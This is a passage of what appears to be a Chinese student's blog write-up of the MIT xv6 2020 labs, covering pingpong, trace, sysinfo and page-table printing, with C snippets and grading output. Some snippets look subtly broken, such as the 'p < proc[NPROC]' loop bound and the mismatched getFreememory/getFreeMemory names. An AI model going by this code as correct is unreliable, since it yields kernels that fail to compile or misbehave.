class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="comment">// 编写一个程序，使用UNIX系统调用在一对管道上的两</span></span><br><span class="line"><span class="comment">// 个进程之间“乒乓”一个字节，每个方向一个。父级应向子</span></span><br><span class="line"><span class="comment">// 级发送一个字节；子进程应该打印“：received ping”，</span></span><br><span class="line"><span class="comment">// 其中是其进程ID，将管道上的字节写入父进程，然后退出；</span></span><br><span class="line"><span class="comment">// 父进程应该从子进程读取字节，打印“：received pong”，</span></span><br><span class="line"><span class="comment">// 然后退出。您的解决方案应该在文件“user/pingpong.c”中。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READEND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITTEND 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *parmsg = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *chimsg = <span class="string">&quot;b&quot;</span>;</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) <span class="comment">// child processs</span></span><br><span class="line">    &#123;</span><br><span class="line">        read(p[READEND], buf, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child receive: %c\n&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">        write(p[WRITTEND], chimsg, <span class="number">1</span>);</span><br><span class="line">        close(p[READEND]);</span><br><span class="line">        close(p[WRITTEND]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        write(p[WRITTEND], parmsg, <span class="number">1</span>);</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">        read(p[READEND], buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent receive: %c\n&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br><span class="line">        close(p[WRITTEND]);</span><br><span class="line">        close(p[READEND]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// yutao@ubuntu:~/xv6-labs-2020$ sudo python3 grade-lab-util pingpong</span></span><br><span class="line"><span class="comment">// make: &#x27;kernel/kernel&#x27; is up to date.</span></span><br><span class="line"><span class="comment">// == Test pingpong == pingpong: OK (1.9s)</span></span><br></pre></td></tr></table></figure><h2 id="prime"><a href="#prime" class="headerlink" title="prime"></a>prime</h2><p>使用的方法是埃拉托斯特尼素数筛，简称筛法。简单地说就是，每次得到一个素数时，在所有小于 n 的数中，删除它的倍数，然后不断迭代，剩下的就全是素数了。</p><p><img src="/2022/07/10/2022-7-10-oslab/sieve.gif"></p><h1 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2 system calls"></a>Lab2 system calls</h1><blockquote><p>  实验指导书：<a href="https://pdos.csail.mit.edu/6.828/2020/labs/syscall.html">https://pdos.csail.mit.edu/6.828/2020/labs/syscall.html</a></p></blockquote><p>需要读xv6book的第2章、4.3、4.4.</p><p>用户空间的系统调用在：<code>user/user.h和user/usys.pl</code></p><p>kernel空间的系统调用在：<code>kernel/kernel.h和kernel/syscall.c</code></p><p>与process相关的代码在：<code>kernel/proc.h &amp;&amp; kernel/proc.c</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout syscall</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><blockquote><p>  In this assignment you will add a system call tracing feature that may help you when debugging later labs. You’ll create a new trace system call that will control tracing. It should take one argument, an integer “mask”, whose bits specify which system calls to trace. For example, to trace the fork system call, a program calls trace(1 &lt;&lt; SYS_fork), where SYS_fork is a syscall number from kernel&#x2F;syscall.h. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call’s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don’t need to print the system call arguments. The trace system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes.</p></blockquote><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ trace <span class="number">32</span> grep hello README</span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">1023</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">966</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">70</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">0</span></span><br><span class="line">$</span><br><span class="line">$ trace <span class="number">2147483647</span> grep hello README</span><br><span class="line"><span class="number">4</span>: syscall trace -&gt; <span class="number">0</span></span><br><span class="line"><span class="number">4</span>: syscall exec -&gt; <span class="number">3</span></span><br><span class="line"><span class="number">4</span>: syscall open -&gt; <span class="number">3</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">1023</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">966</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">70</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">0</span></span><br><span class="line"><span class="number">4</span>: syscall close -&gt; <span class="number">0</span></span><br><span class="line">$</span><br><span class="line">$ grep hello README</span><br><span class="line">$</span><br><span class="line">$ trace <span class="number">2</span> usertests forkforkfork</span><br><span class="line">usertests starting</span><br><span class="line">test forkforkfork: <span class="number">407</span>: syscall fork -&gt; <span class="number">408</span></span><br><span class="line"><span class="number">408</span>: syscall fork -&gt; <span class="number">409</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">410</span></span><br><span class="line"><span class="number">410</span>: syscall fork -&gt; <span class="number">411</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">412</span></span><br><span class="line"><span class="number">410</span>: syscall fork -&gt; <span class="number">413</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">414</span></span><br><span class="line"><span class="number">411</span>: syscall fork -&gt; <span class="number">415</span></span><br><span class="line">...</span><br><span class="line">$</span><br></pre></td></tr></table></figure><blockquote><p>  In the first example above, trace invokes grep tracing just the read system call. The 32 is 1&lt;&lt;SYS_read. In the second example, trace runs grep while tracing all system calls; the 2147583647 has all 31 low bits set. In the third example, the program isn’t traced, so no trace output is printed. In the fourth example, the fork system calls of all the descendants of the forkforkfork test in usertests are being traced. Your solution is correct if your program behaves as shown above (though the process IDs may be different).</p></blockquote><p>在这个实验里，我们需要让内核输出每个mask变量指定的系统函数的调用情况，格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pid&gt;: syscall &lt;syscall_name&gt; -&gt; &lt;return_value&gt;</span><br></pre></td></tr></table></figure><h3 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h3><ol><li>Add <code>$U/_trace</code> to UPROGS in Makefile</li><li>添加声明到<code>user/user.h</code>中</li><li>添加一个<code>entry</code>到<code>user/usys.pl</code></li><li>添加一个syscall number到<code>kernel/syscall.h</code>中</li><li>添加<code>sys_trace()</code>函数到<code>kernel/sysproc.c</code>中</li><li>修改<code>kernel/proc.h</code>中的proc结构体(记录当前进程信息)，添加一个mask值，用来识别system number</li></ol><p>proc结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span> <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>  <span class="comment">// Parent process</span></span><br><span class="line">  <span class="keyword">void</span> *chan;           <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;           <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;           <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;              <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">  <span class="keyword">int</span> mask;                    <span class="comment">// system call</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>sys_trace具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="comment">// argint检索的是第n个系统调用的参数，因此不包括系统调用本身，传入的参数为0</span></span><br><span class="line"><span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">myproc()-&gt;mask = n;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>kernel/proc.c</code>中的<code>fork</code>函数，添加子进程复制父进程mask：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;mask = p-&gt;mask;</span><br></pre></td></tr></table></figure><p>修改<code>kernel/syscall.c</code>，添加<code>SYS_trace</code>的声明，之后加到syscall的数组中，然后添加trace的识别功能。</p><p><code>p-&gt;trapframe-&gt;a0</code>中存放的是函数调用的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> uint64 <span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">.....</span><br><span class="line">[SYS_close] sys_close,</span><br><span class="line">[SYS_trace] sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *sysCallName[<span class="number">23</span>] = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line"> <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;dup&quot;</span>, <span class="string">&quot;getpid&quot;</span>, <span class="string">&quot;sbrk&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line"> <span class="string">&quot;open&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;trace&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">num = p-&gt;trapframe-&gt;a7;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;mask &amp; (<span class="number">1</span> &lt;&lt; num))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, sysCallName[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">   p-&gt;pid, p-&gt;name, num);</span><br><span class="line">p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo python3 grade-lab-syscall trace</span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to date.</span><br><span class="line">== Test trace 32 grep == trace 32 grep: OK (1.4s) </span><br><span class="line">== Test trace all grep == trace all grep: OK (1.0s) </span><br><span class="line">== Test trace nothing == trace nothing: OK (1.0s) </span><br><span class="line">== Test trace children == trace children: OK (12.1s) </span><br></pre></td></tr></table></figure><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><blockquote><p>  <a href="https://github.com/whileskies/xv6-labs-2020/blob/main/doc/Lab2-system%20calls.md">https://github.com/whileskies/xv6-labs-2020/blob/main/doc/Lab2-system%20calls.md</a></p></blockquote><blockquote><p>  In this assignment you will add a system call, sysinfo, that collects information about the running system. The system call takes one argument: a pointer to a struct sysinfo (see kernel&#x2F;sysinfo.h). The kernel should fill out the fields of this struct: the freemem field should be set to the number of bytes of free memory, and the nproc field should be set to the number of processes whose state is not UNUSED. We provide a test program sysinfotest; you pass this assignment if it prints “sysinfotest: OK”.</p></blockquote><p>添加一个系统调用<code>sysinfo</code>，用于收集有关正在运行的系统的信息。系统调用采用一个参数：指向结构<code>sysinfo</code>的指针（参见<code>kernel/sysinfo.h</code>）。内核应填写此结构的字段：<code>freemem</code>字段应设置为可用内存的字节数，<code>nproc</code>字段应设置为其状态未使用的进程数。提供了一个测试程序sysinfotest；如果输出“sysinfotest:OK”，则通过此分配。</p><ol><li>添加<code>$U/_sysinfotest\</code></li><li>添加函数声明到<code>user.h</code>，添加<code>entry</code>到<code>usys.pl</code>，添加<code>syscall number</code>到<code>syscall.h</code>，然后加入到<code>syscall</code>函数数组中</li><li>然后为了添加<code>sys_sysinfo</code>函数到<code>kernel/sysproc.c</code>，这里为了实现需要在<code>kernel/proc.c</code>和<code>kernel/kalloc.c</code>中分别添加函数获取正在使用的进程和可用的内存数，然后记得将添加的函数声明在<code>defs.h</code></li><li>然后实现<code>sys_sysinfo</code>函数，这里需要看一下<code>copyout</code>函数的使用方法(参考<code>sys_fstat(kernel/sysfile.c)</code>和<code>filestat(kernel/file.c)</code>)</li></ol><p>添加函数声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysinfo</span><span class="params">(struct sysinfo *)</span></span>;</span><br></pre></td></tr></table></figure><p>添加<code>entry</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure><p>添加<code>syscall</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//syscall.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_sysinfo 23</span></span><br></pre></td></tr></table></figure><p>加到<code>syscallname</code>的数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//还有syscalls的数组也要加</span></span><br><span class="line"><span class="keyword">char</span> *sysCallName[<span class="number">24</span>] = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line"> <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;dup&quot;</span>, <span class="string">&quot;getpid&quot;</span>, <span class="string">&quot;sbrk&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line"> <span class="string">&quot;open&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;trace&quot;</span>, <span class="string">&quot;sysinfo&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p><code>kernel/proc.c</code>加<code>processNum</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">processNum</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">uint64 cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (p = proc; p &lt; proc[NPROC]; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;state != UNUSED)</span><br><span class="line">&#123;</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kalloc.c</code>加<code>getFreeMemory</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">getFreeMemory</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"><span class="keyword">for</span> (r = kmem.freelist; r; r = r-&gt;next, num++)</span><br><span class="line">;</span><br><span class="line"><span class="keyword">return</span> num * PGSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在<code>defs.h</code>中添加声明</p><p><code>sysproc.c</code>加<code>sys_sysinfo</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">uint64 addr;</span><br><span class="line"><span class="keyword">if</span> (argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">info.freemem = getFreememory();</span><br><span class="line">info.nproc = processNum();</span><br><span class="line"><span class="keyword">if</span> (copyout(p-&gt;pagetable, addr, (<span class="keyword">char</span> *)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/07/10/2022-7-10-oslab/image-20220720142621715.png" alt="image-20220720142621715"></p><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><blockquote><p>  指导书：<a href="https://pdos.csail.mit.edu/6.828/2020/labs/pgtbl.html">https://pdos.csail.mit.edu/6.828/2020/labs/pgtbl.html</a></p></blockquote><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>打印页表的一些信息，用来帮助调试的。</p><blockquote><p>  Define a function called <code>vmprint()</code>. It should take a <code>pagetable_t</code> argument, and print that pagetable in the format described below. Insert <code>if(p-&gt;pid==1) vmprint(p-&gt;pagetable)</code> in exec.c just before the <code>return argc</code>, to print the first process’s page table. You receive full credit for this assignment if you pass the <code>pte printout</code> test of <code>make grade</code>.</p></blockquote><blockquote><p>  第一行显示vmprint的参数。之后，每个PTE都有一行，包括引用树中更深的页-表-页的PTE。每个PTE行由若干“.”缩进这表明它在树中的深度。每个PTE行显示其页面表页面中的PTE索引、PTE位和从PTE提取的物理地址。不要打印无效的PTE。在上例中，顶级页面table页面具有条目0和255的映射。条目0的下一级仅映射了索引0，该索引0的底层映射了条目0、1和2。</p></blockquote><ul><li><p><code>defs.c</code>中加vmprint定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p><code>kernel/exec.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exec.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  vmprint(p-&gt;pagetable); <span class="comment">// 按照实验要求，在 exec 返回之前打印一下页表。</span></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>kernel/vm.c</code>中写<code>vmprint()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprintwalk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">int</span> deep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 